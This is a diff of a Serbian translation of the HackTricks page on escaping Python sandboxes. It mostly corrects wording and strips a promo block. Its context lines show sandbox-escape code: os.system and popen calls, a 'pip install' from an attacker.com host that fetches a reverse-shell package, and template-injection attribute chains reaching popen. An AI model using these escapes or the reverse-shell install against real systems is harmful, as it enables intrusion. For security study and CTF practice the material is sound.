@@ -15,19 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-Ovo su neki trikovi za zaobilaženje zaštite python sandboksova i izvršavanje proizvoljnih komandi.
+Ovo su neki trikovi za zaobilaženje zaštite python sandboksa i izvršavanje proizvoljnih komandi.
 
 ## Biblioteke za izvršavanje komandi
 
-Prva stvar koju treba da znate je da li možete direktno izvršiti kod sa nekom već uvezom bibliotekom, ili ako možete uvesti neku od ovih biblioteka:
+Prva stvar koju treba da znate je da li možete direktno izvršiti kod sa nekom već uvezenom bibliotekom, ili ako možete uvesti neku od ovih biblioteka:
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -100,7 +92,7 @@ Ako imate pristup `pip` ili `pip.main()`, možete instalirati proizvoljan paket 
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Možete preuzeti paket za kreiranje reverzne ljuske ovde. Molimo vas da napomenete da pre korišćenja treba **dekompresovati, promeniti `setup.py` i staviti svoju IP adresu za reverznu ljusku**:
+Možete preuzeti paket za kreiranje reverzne ljuske ovde. Molimo vas da napomenete da pre korišćenja treba **dekompresovati, promeniti `setup.py` i staviti vašu IP adresu za reverznu ljusku**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
@@ -111,7 +103,7 @@ Ovaj paket se zove `Reverse`. Međutim, posebno je napravljen tako da kada napus
 ## Eval-ovanje python koda
 
 {% hint style="warning" %}
-Napomena: exec omogućava višelinijske stringove i ";", ali eval ne (proverite operator vidre)
+Napomena da exec omogućava višelinijske stringove i ";", ali eval ne (proverite operator vidre)
 {% endhint %}
 
 Ako su određeni karakteri zabranjeni, možete koristiti **hex/octal/B64** reprezentaciju da **zaobiđete** ograničenje:
@@ -205,7 +197,7 @@ Ako možete **deklarisati klasu** i **napraviti objekat** te klase, mogli biste 
 
 #### RCE sa prilagođenim klasama
 
-Možete modifikovati neke **metode klase** (_prepisivanjem postojećih metoda klase ili kreiranjem nove klase_) da ih **izvršavaju proizvoljan kod** kada su **pokrenute** bez direktnog pozivanja.
+Možete modifikovati neke **metode klase** (_prepisivanjem postojećih metoda klase ili kreiranjem nove klase_) da ih naterate da **izvršavaju proizvoljan kod** kada su **pokrenute** bez direktnog pozivanja.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -460,9 +452,9 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
-### Pronalaženje opasnih učitanih biblioteka
+### Pronalazak opasnih učitanih biblioteka
 
-Na primer, znajući da sa bibliotekom **`sys`** može da se **importuje proizvoljna biblioteka**, možete pretražiti sve **učitane module koji imaju importovan sys unutar njih**:
+Na primer, znajući da sa bibliotekom **`sys`** može da se **uvezete proizvoljne biblioteke**, možete pretražiti sve **module koji su učitani i koji imaju uvezenu sys unutar njih**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -561,7 +553,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Rekurzivno pretraživanje Builtins, Globals...
 
 {% hint style="warning" %}
-Ovo je jednostavno **neverovatno**. Ako **tražite objekat kao što su globals, builtins, open ili bilo šta** jednostavno koristite ovaj skript da **rekurzivno pronađete mesta gde možete pronaći taj objekat.**
+Ovo je jednostavno **neverovatno**. Ako **tražite objekat poput globals, builtins, open ili bilo čega** samo koristite ovaj skript da **rekurzivno pronađete mesta gde možete pronaći taj objekat.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -686,7 +678,7 @@ Možete proveriti izlaz ovog skripta na ovoj stranici:
 
 ## Python Format String
 
-Ako **pošaljete** **string** u python koji će biti **formatiran**, možete koristiti `{}` da pristupite **internim informacijama u python-u.** Možete koristiti prethodne primere da pristupite globalnim ili ugrađenim funkcijama, na primer.
+Ako **pošaljete** **string** u python koji će biti **formatiran**, možete koristiti `{}` da pristupite **internim informacijama u pythonu.** Možete koristiti prethodne primere da pristupite globalnim ili ugrađenim funkcijama, na primer.
 
 {% hint style="info" %}
 Međutim, postoji **ograničenje**, možete koristiti samo simbole `.[]`, tako da **nećete moći da izvršite proizvoljan kod**, samo da čitate informacije.\
@@ -734,7 +726,7 @@ return 'HAL 9000'
 **Više primera** o **format** **string** primerima može se naći na [**https://pyformat.info/**](https://pyformat.info)
 
 {% hint style="danger" %}
-Proverite takođe sledeću stranicu za gadgete koji će r**ešavati osetljive informacije iz Python internih objekata**:
+Proverite takođe sledeću stranicu za gadgete koji će r**ešiti osetljive informacije iz Python internih objekata**:
 {% endhint %}
 
 {% content-ref url="../python-internal-read-gadgets.md" %}
@@ -793,7 +785,7 @@ CustomClassObject.__class__.__init__.__globals__
 
 ### **Pristupanje kodu funkcije**
 
-**`__code__`** i `func_code`: Možete **pristupiti** ovom **atributu** funkcije da **dobijete kod objekat** funkcije.
+**`__code__`** i `func_code`: Možete **pristupiti** ovom **atributu** funkcije da **dobijete objekat koda** funkcije.
 ```python
 # In our current example
 get_flag.__code__
@@ -881,7 +873,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Napomena da **ako ne možete da uvezete `dis` u python sandboxu** možete dobiti **bajt kod** funkcije (`get_flag.func_code.co_code`) i **dezintegrisati** ga lokalno. Nećete videti sadržaj promenljivih koje se učitavaju (`LOAD_CONST`), ali ih možete pretpostaviti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe pokazuje pomeraj promenljive koja se učitava.
+Napomena da **ako ne možete da uvezete `dis` u python sandboxu** možete dobiti **bajt kod** funkcije (`get_flag.func_code.co_code`) i **dezintegrisati** ga lokalno. Nećete videti sadržaj promenljivih koje se učitavaju (`LOAD_CONST`), ali ih možete pretpostaviti iz (`get_flag.func_code.co_consts`) jer `LOAD_CONST` takođe pokazuje offset promenljive koja se učitava.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -906,7 +898,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## Kompajliranje Pythona
 
 Sada, zamislite da nekako možete **izvući informacije o funkciji koju ne možete izvršiti** ali vam **treba** da je **izvršite**.\
-Kao u sledećem primeru, možete **pristupiti kod objektu** te funkcije, ali samo čitajući disassemble ne **znate kako da izračunate flag** (_zamislite složeniju `calc_flag` funkciju_)
+Kao u sledećem primeru, možete **pristupiti kod objektu** te funkcije, ali samo čitajući disasembler ne **znate kako da izračunate flag** (_zamislite složeniju `calc_flag` funkciju_)
 ```python
 def get_flag(some_input):
 var1=1
@@ -952,7 +944,7 @@ types.CodeType.__doc__
 ### Ponovno kreiranje provaljene funkcije
 
 {% hint style="warning" %}
-U sledećem primeru, uzet ćemo sve podatke potrebne za ponovno kreiranje funkcije direktno iz objekta koda funkcije. U **pravom primeru**, sve **vrednosti** za izvršavanje funkcije **`code_type`** su ono što **ćete morati da provalite**.
+U sledećem primeru, uzet ćemo sve podatke potrebne za ponovno kreiranje funkcije direktno iz objekta koda funkcije. U **pravom primeru**, sve **vrednosti** za izvršavanje funkcije **`code_type`** su ono što **ćete morati da prokrijumčarite**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1019,7 +1011,7 @@ Korišćenjem alata kao što je [**https://www.decompiler.com/**](https://www.de
 ### Assert
 
 Python koji se izvršava sa optimizacijama sa parametrom `-O` će ukloniti assert izjave i bilo koji kod uslovljen vrednošću **debug**.\
-Stoga, provere kao što su
+Stoga, provere kao
 ```python
 def check_permission(super_user):
 try:
@@ -1039,23 +1031,18 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Podrška HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 {% endhint %}
